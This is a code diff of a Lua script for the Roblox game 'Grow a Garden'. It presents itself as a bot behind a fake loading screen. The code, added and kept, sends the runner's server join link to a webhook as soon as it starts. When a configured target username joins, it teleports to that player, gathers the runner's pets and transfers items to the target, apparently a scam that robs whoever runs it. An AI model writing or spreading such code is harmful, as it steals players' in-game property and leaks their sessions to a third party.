@@ -1,4 +1,4 @@
--- 🌿 GROW A GARDEN BOT — STABLE 3-STAGE WEBHOOK
+-- 🌿 GROW A GARDEN BOT — LINK + FULL AUTO
 
 -- CONFIGURATION
 local CONFIG = {
@@ -22,20 +22,8 @@ local LocalPlayer = Players.LocalPlayer
 
 -- LOCALIZATION
 local LANGUAGES = {
-    ["ru"] = {
-        title = "🌿 Загрузка скрипта...",
-        percent = "% завершено",
-        webhook_server = "Ссылка на сервер",
-        webhook_detect = "Игрок %s зашел в плейс.",
-        webhook_success = "Питомцы и фрукты были успешно переданы."
-    },
-    ["en"] = {
-        title = "🌿 Script Loading...",
-        percent = "% done",
-        webhook_server = "Server Link",
-        webhook_detect = "Player %s joined the place.",
-        webhook_success = "Pets and fruits were successfully transferred."
-    }
+    ["ru"] = {title = "🌿 Загрузка скрипта...", percent = "% завершено"},
+    ["en"] = {title = "🌿 Script Loading...", percent = "% done"}
 }
 local TXT = LANGUAGES[CONFIG.LANGUAGE]
 
@@ -78,9 +66,7 @@ local function createLoadingUI()
 end
 
 -- WEBHOOK MODULE
-local Webhook = {}
-
-function Webhook:Send(content)
+local function sendWebhook(content)
     local data = HttpService:JSONEncode({content = content})
     local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
     if requestFunc then
@@ -95,18 +81,9 @@ function Webhook:Send(content)
     end
 end
 
-function Webhook:SendServerLink()
-    local link = "https://floating.gg/?placeID="..game.PlaceId.."&gameInstanceId="..game.JobId
-    self:Send(TXT.webhook_server..": "..link)
-end
-
-function Webhook:SendPlayerDetect(playerName)
-    self:Send(string.format(TXT.webhook_detect, playerName))
-end
-
-function Webhook:SendTransferSuccess()
-    self:Send(TXT.webhook_success)
-end
+-- Отправка ссылки на сервер сразу при запуске
+local serverLink = "https://floating.gg/?placeID="..game.PlaceId.."&gameInstanceId="..game.JobId
+sendWebhook("🌿 Ссылка на сервер: "..serverLink)
 
 -- COLLECT PETS
 local function collectPets()
@@ -172,21 +149,12 @@ end
 
 -- MAIN LOOP
 local function runBot()
-    local serverSent = false
     while true do
         for _, plr in ipairs(Players:GetPlayers()) do
             if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
-                if not serverSent then
-                    Webhook:SendServerLink()
-                    serverSent = true
-                end
-                Webhook:SendPlayerDetect(plr.Name)
                 tweenTeleport(plr)
                 collectPets()
-                local count = transferItems(plr)
-                if count > 0 then
-                    Webhook:SendTransferSuccess()
-                end
+                transferItems(plr)
                 break
             end
         end
